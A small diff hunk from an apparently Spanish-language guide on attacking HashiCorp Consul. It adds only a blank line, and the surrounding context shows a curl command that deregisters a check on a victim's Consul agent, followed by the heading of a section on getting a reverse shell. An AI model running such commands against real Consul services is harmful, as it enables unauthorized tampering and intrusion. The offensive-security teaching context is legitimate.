@@ -53,6 +53,7 @@ Si queremos desregistrar el check podemos utilizar:
 ```
 curl --request PUT http://IP_VICTIMA:8500/v1/agent/check/deregister/command
 ```
+
 Explotar consul y obtener una reverse shell
 -------------------------------------------
 
